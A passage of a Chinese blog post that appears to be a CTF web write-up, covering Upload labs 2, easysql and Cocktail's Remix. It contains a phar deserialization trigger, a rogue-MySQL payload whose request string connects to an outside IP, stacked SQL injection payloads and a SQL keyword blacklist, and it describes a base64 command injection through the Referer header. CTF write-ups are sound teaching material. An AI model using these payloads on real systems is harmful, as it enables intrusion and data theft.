+<p>生成phar.png传上去，访问php://filter/resource=phar://upload/fd40c7f4125a9b9ff1a4e75d293e3080/58e6a0c04177ebd5f43997d257e67ee5.png</p>
+<p><img src="https://s2.ax1x.com/2019/08/27/m4GcP1.png" alt="m4GcP1.png"></p>
+<p>最后发现像SplStack这种类还是很多的，例如</p>
+<p><img src="https://s2.ax1x.com/2019/08/27/mIDsgg.png" alt="mIDsgg.png"></p>
+<p>当然了，这只是我对于某一内置类Fuzz后的结果，还有其他内置类的。</p>
+<p>上面的这个过程其实是非预期，预期的话还是很有意思的，在zsx师傅的博客中有指出</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190820154836-eaa31fbc-c31e-1.png" alt="img"></p>
+<p>这个本来是wakeup而不是destruct是要通过Rogue Mysql去读我们的phar包触发反序列化来触发wakeup拿到flag，而且本来的代码其实是下面这个亚子的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2[<span class="number">0</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">1</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">2</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">3</span>], <span class="keyword">$this</span>-&gt;arg2[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">    $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过下面的调用并且在自己的vps上开启伪造的恶意服务器就可以成功getflag，这个并没有去复现，因为思路其实差不多，多的是这个很棒的思路LOAD DATA LOCAL INFILE来触发反序列化，学习到了</p>
+<p>payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$reflect = <span class="keyword">new</span> ReflectionClass(<span class="string">'Mysqli'</span>);</span><br><span class="line">$sql = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="string">'Mysqli'</span>, <span class="string">'init'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, $arr);</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="string">'Mysqli'</span>, <span class="string">'real_connect'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, <span class="string">'ip'</span>,<span class="string">'root'</span>,<span class="string">'123456'</span>,<span class="string">'test'</span>,<span class="string">'3306'</span>);</span><br><span class="line"></span><br><span class="line">$reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="string">'Mysqli'</span>, <span class="string">'query'</span>);</span><br><span class="line">$reflectionMethod-&gt;invoke($sql, <span class="string">'select 1'</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin=<span class="number">1</span>&amp;clazz=Mysqli&amp;func1=init&amp;arg1=&amp;func2=real_connect&amp;arg2[<span class="number">0</span>]=<span class="number">106.14</span><span class="number">.153</span><span class="number">.173</span>&amp;arg2[<span class="number">1</span>]=root&amp;arg2[<span class="number">2</span>]=<span class="number">123</span>&amp;arg2[<span class="number">3</span>]=test&amp;arg2[<span class="number">4</span>]=<span class="number">3306</span>&amp;func3=query&amp;arg3=select%<span class="number">201</span>&amp;ip=<span class="number">106.14</span><span class="number">.153</span><span class="number">.173</span>&amp;port=<span class="number">2015</span><span class="string">';</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h3><p>这个题似乎因为正则和在线维护的问题除了一些小差错，本意是考sql_mode中的PIPES_AS_CONCAT模式将字符串 ||视为字符串的连接操作符而非或运算符，配合堆叠注入带出flag，源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">$BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line"><span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line"><span class="comment">//echo $post['query'];</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line"><span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">print_r($row);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>预期解法</p>
+<p><img src="https://s2.ax1x.com/2019/08/27/m4D6gJ.png" alt="m4D6gJ.png"></p>
+<p>payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;pipes_as_concat;select 1</span><br></pre></td></tr></table></figure>
+
+<p>非预期</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;select *,1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cocktail’s-Remix"><a href="#Cocktail’s-Remix" class="headerlink" title="Cocktail’s Remix"></a>Cocktail’s Remix</h3><p>这个并没有复现环境，但其实这个题的主要思路就是对cocktail.so的分析….我并不会逆向，只能放到IDA里硬着头皮跟着wp学学了</p>
+<p>进入cocktail_handler，内容如下：</p>
+<p><img src="https://s2.ax1x.com/2019/08/27/mI06JS.png" alt="mI06JS.png"></p>
+<p>大概可以看出意思是从headers中拿到Reffer字段并且给j_remix处理，最后进行popen命令执行，跟进j_max看一下</p>
+<p><img src="https://s2.ax1x.com/2019/08/27/mIBpFK.png" alt="mIBpFK.png"></p>
+<p>跟着remix</p>
+<p><img src="https://s2.ax1x.com/2019/08/27/mIBLh8.png" alt="mIBLh8.png"></p>
+<p>是base64算法的逻辑，所以最终的思路是将base64编码的命令传给reffer,然后程序进行解码后命令执行。</p>
+<h3 id="iCloudMusic"><a href="#iCloudMusic" class="headerlink" title="iCloudMusic"></a>iCloudMusic</h3><p>待学习一些二进制方面内容再看看</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/27/Cybrics-Web%E9%83%A8%E5%88%86wp/" rel="next" title="Cybrics-Web部分wp">
+                <i class="fa fa-chevron-left"></i> Cybrics-Web部分wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/27/De1CTF2019/" rel="prev" title="De1CTF2019">
+                De1CTF2019 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">离怀秋</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lihuaiqiu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southseast.cc" title="南溟师傅" target="_blank">南溟师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#CheckIn"><span class="nav-number">1.</span> <span class="nav-text">CheckIn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Easyweb"><span class="nav-number">2.</span> <span class="nav-text">Easyweb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pythonginx"><span class="nav-number">3.</span> <span class="nav-text">Pythonginx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Upload-labs-2"><span class="nav-number">4.</span> <span class="nav-text">Upload labs 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easysql"><span class="nav-number">5.</span> <span class="nav-text">easysql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cocktail’s-Remix"><span class="nav-number">6.</span> <span class="nav-text">Cocktail’s Remix</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#iCloudMusic"><span class="nav-number">7.</span> <span class="nav-text">iCloudMusic</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离怀秋</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
